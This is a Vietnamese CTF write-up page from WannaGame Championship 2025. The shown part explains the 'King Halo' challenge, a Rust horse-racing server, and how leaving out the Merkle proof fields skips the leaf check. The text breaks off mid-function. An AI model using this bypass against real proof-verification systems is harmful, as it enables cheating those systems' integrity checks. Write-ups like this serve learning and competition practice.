<!doctype html>
<html
  lang="en-us" 
  data-theme-mode="auto"
  >
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, shrink-to-fit=no"
/><title>
  WannaGame Championship 2025 | r1muru
</title>
<meta name="description" content="Lần đầu với team laviaespa và đứng vị trí thứ 4 chung cuộc"/><script>
  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":false,\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
  
</script>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="preload"
  as="style"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
/>
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
  media="print"
  onload="this.media='all'"
/>
<link
    rel="stylesheet"
    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/regular.min.css"
    integrity="sha384-4qYppzjH8EiA&#43;cGdaubu2vL7Rk8WGiqCSj7oRuP1uwtFWkfKNHD20lPfcrbQc8dU" crossorigin="anonymous"/><link
    rel="stylesheet"
    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/solid.min.css"
    integrity="sha384-wbMWab3UDSPm2kvIgVOn/d9KPTecgPU1&#43;Nb3zoQrm/oVu0EkPL6IaKinjbwW0rum" crossorigin="anonymous"/><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/brands.min.css"
    integrity="sha384-KTGeC2hIMzpeQakhsmzB9bZfhCD5xZZCgI1iZH6f/O457SxzlkzTQg/WXFNoi3ih" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v5-font-face.min.css"
    integrity="sha384-nJ1ThfldViXoLpJ6jlKcP2beas8BMbYq26SG9Hi8cH89bZi4RZ644v7helMCqJxd" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v4-font-face.min.css"
    integrity="sha384-UlkrhOIvZxJFd4MElSUp7ow6/RUeYKi/orfCZIRRiOENFuQPIAA3T3HjYfmBRhNq" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><link rel="stylesheet" href="/css/loader.css" />
<meta property="og:type" content="website" />
  <meta property="og:title" content="WannaGame Championship 2025 | r1muru" />
  <meta
    property="og:description"
    content="Lần đầu với team laviaespa và đứng vị trí thứ 4 chung cuộc"
  />
  <meta property="og:url" content="http://localhost:1313/post/wannagamechampionship2025/" />
  <meta
    property="og:site_name"
    content="r1muru&#39;s blog"
  />
  <meta
    property="og:image"
    content="/images/WannaChamp/avatar.png"
  />
  <meta property="article:author" content="r1muru" />
  <meta property="article:published_time" content="2025-12-08T13:44:12&#43;07:00" />
  <meta property="article:modified_time" content="2025-12-08T13:44:12&#43;07:00" /><meta property="article:tag" content="CTFCryptographyReverseWeb3" /><meta name="twitter:card" content="summary" />
  <meta name="twitter:image" content="/images/WannaChamp/avatar.png" />
<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
<link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><link
    rel="preload"
    as="style"
    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
  /><script
    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
    rel="stylesheet"
    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/><link
    rel="stylesheet"
    href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css"
    integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj&#43;vDDLIL&#43;xBGQU/voDBY5XE2lVh" crossorigin="anonymous"/></head>
  <body><div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi rotate"><img src="/images/loading.svg" alt="loading" /></div><div class="loading-word">Loading...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var loaderEl = document.getElementById('loader');
    var startLoading = () => {
      time = Date.now();
      loaderEl.classList.remove("loading");
    }
    var hideLoader = () => {
      document.body.style.overflow = 'auto';
      loader.classList.add('loading');
    };

    var endLoading = () => {
      if (!time) {
        hideLoader();
      } else {
        if (Date.now() - time > 500) {
          time = null;
          hideLoader();
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    loaderEl.addEventListener('click', endLoading);
  </script><div id="copy-tooltip"></div>
<div id="lang-tooltip">
This article does not have a corresponding language version
</div>
<div id="heatmap-tooltip"></div><div id="container">
      <div id="wrap"><div id="header-nav">
  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
        <div class='main-nav-icon icon '>&#xf015;</div>
        <span class="main-nav-link">Home</span>
      </a><a class="main-nav-link-wrap" href="/archives">
        <div class='main-nav-icon icon '>&#xf187;</div>
        <span class="main-nav-link">Archives</span>
      </a><a class="main-nav-link-wrap" href="/about">
        <div class='main-nav-icon icon '>&#xf007;</div>
        <span class="main-nav-link">About</span>
      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
  </nav>
  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="Search" aria-label="Search"></a></nav></div>
<header id="header" aria-label="Site header"><picture></picture>
    <img  fetchpriority="high" src="/images/WannaChamp/avatar.png" alt="WannaGame Championship 2025"><div id="header-outer">
    <div id="header-title"><span id="logo">
            <h1 data-aos="slide-up">WannaGame Championship 2025</h1>
          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
  </div>
</header><div id="content"
          aria-label="Page content"
          class="sidebar-left"
            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><meting-js
        theme="var(--color-link)"
        id="8668604226"server="netease"type="playlist"fixed="false"autoplay="true"loop="all"order="list"preload="auto"volume="0.7"list-folded="false">
      </meting-js><div class="sidebar-wrapper">
    <div
      class="sidebar-wrap"
      data-aos="fade-up"
    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
<div class="sidebar-toc-wrapper toc-div-class">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#king-halo">King Halo</a></li>
  </ul>

  <ul>
    <li><a href="#buzzing">Buzzing</a></li>
  </ul>

  <ul>
    <li><a href="#freex">Freex</a></li>
    <li><a href="#wickedcraft">WickedCraft</a></li>
  </ul>
</nav>
</div></div>
          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img
    data-src="/avatar/avatar.png"
    data-sizes="auto"
    alt="r1muru"
    class="lazyload"
  />
  <div class="sidebar-author-name">r1muru</div>
  <div class="sidebar-description">Life is not fair, get used to it</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">13</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      4
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">11</div>
  </a>
</div>
<div class="sidebar-social"><div class="icon-discord sidebar-social-icon">
      <a
        href="https://discordapp.com/users/r1muru2006"
        itemprop="url"
        target="_blank"
        aria-label="discord"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-email sidebar-social-icon">
      <a
        href="cuongchu200@gmail.com"
        itemprop="url"
        target="_blank"
        aria-label="email"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-facebook sidebar-social-icon">
      <a
        href="https://www.facebook.com/chu.cuong.732399"
        itemprop="url"
        target="_blank"
        aria-label="facebook"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/r1muru2006"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener nofollow noreferrer"
      ></a>
    </div><div class="icon-instagram sidebar-social-icon">
      <a
        href="https://www.instagram.com/r1murun0pr0"
        itemprop="url"
        target="_blank"
        aria-label="instagram"
        rel="noopener nofollow noreferrer"
      ></a>
    </div></div>
<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>&#xf015;</div>
      <div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>&#xf187;</div>
      <div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon '>&#xf007;</div>
      <div class="sidebar-menu-link">About</div>
    </div></div>
</div><div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div></div>
  </div><div class="sidebar-widget"></div></div></aside>
<section id="main" aria-label="Main content"><article
  class="h-entry article"
  itemscope
  itemtype="https://schema.org/BlogPosting"
>
  <div
    class="article-inner"
    data-aos="fade-up"
  >
    <div class="article-meta"><div class="article-date">
  <span
    class="article-date-link icon-calendar"
    data-aos="zoom-in"
  >
    <time datetime="2025-12-08 13:44:12 &#43;0700 &#43;07" itemprop="datePublished"
      >2025-12-08</time
    >
    <time style="display: none;" id="post-update-time"
      >2025-12-08</time
    >
  </span></div>
<div class="article-category"><a
      class="article-category-link"
      href="/categories/ctf-write-up"
      data-aos="zoom-in"
      >CTF WRITE-UP</a
    ><a
      class="article-category-link"
      href="/categories/wannagame"
      data-aos="zoom-in"
      >WANNAGAME</a
    ></div>
</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="crypto">
<a class="header-anchor" href="#crypto"></a>
Crypto
</h1><h2 id="king-halo">
<a class="header-anchor" href="#king-halo"></a>
King Halo
</h2><p><strong>Mô tả</strong>: Uma Musume is the best mobile game in 2025</p>
<p><a href="https://www.youtube.com/watch?v=eAkxxgEHEmg">https://www.youtube.com/watch?v=eAkxxgEHEmg</a></p>
<p><strong>Đính kèm</strong>: <code>attachments.tar</code></p>
<p>Thử thách này sử dụng Rust làm ngôn ngữ chính để chạy chương trình.
Yêu cầu của nó là mình phải chiến thắng 50 rounds đua ngựa để lấy được flag. Đầu tiền, đăng ký tên và chiến thuật cho 1 con ngựa:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="fm">write!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Register your horse name: &#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">writer</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">horse_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_line_trimmed</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="n">horse_name</span><span class="p">.</span><span class="n">is_empty</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Name cannot be empty. Session terminated.&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Choose your running strategy:&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;  1) Front-runner&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;  2) Pace-maker&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;  3) Late charge&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;  4) End spurt&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">write!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Strategy selection: &#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">writer</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">strategy_line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_line_trimmed</span><span class="p">(</span><span class="n">reader</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">user_strategy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">match</span><span class="w"> </span><span class="n">parse_strategy_choice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">strategy_line</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Some</span><span class="p">(</span><span class="n">strategy</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">strategy</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">None</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Invalid strategy choice. Session terminated.&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span></code></pre></div><p>Sau đó, đề cho mình biết các dữ kiện như là: <code>race distance</code>, <code>merkle root</code>, các vị trí và chỉ số của 16 con ngựa (tính cả ngựa của mình):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Race distance: {}m&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">race_distance</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Merkle root: {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">fp_to_hex</span><span class="p">(</span><span class="o">&amp;</span><span class="n">root</span><span class="p">))</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Your horse occupies slot {}.&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">user_slot</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">writeln!</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">writer</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;Index | Name                 | Strategy        | Stats [spd sta pow gut wit]&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="w"> </span><span class="n">entry</span><span class="p">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">entries</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">enumerate</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">marker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">user_slot</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">&#34;*&#34;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">&#34; &#34;</span><span class="w"> </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">writeln!</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">writer</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;{}{:&gt;2} | {:&lt;20} | {:&lt;15} | [{:&gt;6.1} {:&gt;6.1} {:&gt;6.1} {:&gt;6.1} {:&gt;6.1}]&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">marker</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">idx</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">profiles</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">name</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">entry</span><span class="p">.</span><span class="n">strategy</span><span class="p">.</span><span class="n">get_name</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">entry</span><span class="p">.</span><span class="n">speed</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">entry</span><span class="p">.</span><span class="n">stamina</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">entry</span><span class="p">.</span><span class="n">power</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">entry</span><span class="p">.</span><span class="n">guts</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">entry</span><span class="p">.</span><span class="n">wit</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Cuối cùng đề trả về <code>proof</code> cho con ngựa của mình gồm <code>index</code>, <code>leaf</code>, <code>path_elements</code> và <code>path_indices</code>. Mình sẽ phải gửi lại proof của con ngựa chiến thắng vì không có hàm check con ngựa đó có phải của mình không.</p>
<p>Đọc hết hàm <code>server.rs</code>, mình thấy có một chi tiết ở cuối:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[derive(Deserialize)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">struct</span> <span class="nc">UserProofPayload</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">index</span>: <span class="kt">usize</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">leaf</span>: <span class="nb">String</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">#[serde(default)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">path_elements</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cp">#[serde(default)]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">path_indices</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Nếu gửi JSON thiếu 2 trường <code>path_elements</code> và <code>path_indices</code>, chúng sẽ là Vector rỗng []. Nếu nó rỗng thì server sẽ không kiểm tra <code>leaf</code> có khớp không vì vòng lặp sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">provided_proof_result</span>: <span class="nc">io</span>::<span class="nb">Result</span><span class="o">&lt;</span><span class="nb">Vec</span><span class="o">&lt;</span><span class="p">(</span><span class="kt">bool</span><span class="p">,</span><span class="w"> </span><span class="n">Fp</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">provided_indices</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="n">into_iter</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="n">zip</span><span class="p">(</span><span class="n">provided_elements</span><span class="p">.</span><span class="n">into_iter</span><span class="p">())</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="p">(</span><span class="n">is_left</span><span class="p">,</span><span class="w"> </span><span class="n">sibling</span><span class="p">)</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">leaves</span><span class="p">[</span><span class="n">provided_payload</span><span class="p">.</span><span class="n">index</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">provided_leaf</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="fm">writeln!</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;Provided leaf does not match the claimed horse slot. Game over.&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">io</span>::<span class="n">Error</span>::<span class="n">new</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">io</span>::<span class="n">ErrorKind</span>::<span class="n">InvalidData</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;provided leaf does not match slot&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nb">Ok</span><span class="p">((</span><span class="n">is_left</span><span class="p">,</span><span class="w"> </span><span class="n">sibling</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></div><p>Ở hàm <code>verify_proof</code>, nếu <code>proof</code> rỗng thì nó sẽ đưa <code>leaf</code> vào thẳng <code>circuit</code> rồi so sánh với <code>root</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">verify_proof</span><span class="p">(</span><span class="n">root</span>: <span class="nc">Fp</span><span class="p">,</span><span class="w"> </span><span class="n">leaf</span>: <span class="nc">Fp</span><span class="p">,</span><span class="w"> </span><span class="n">proof</span>: <span class="kp">&amp;</span><span class="p">[(</span><span class="kt">bool</span><span class="p">,</span><span class="w"> </span><span class="n">Fp</span><span class="p">)],</span><span class="w"> </span><span class="n">expected_depth</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">bool</span> <span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">proof</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">expected_depth</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">eprintln!</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;[verify_proof] Depth mismatch: expected </span><span class="si">{}</span><span class="s">, got </span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w">
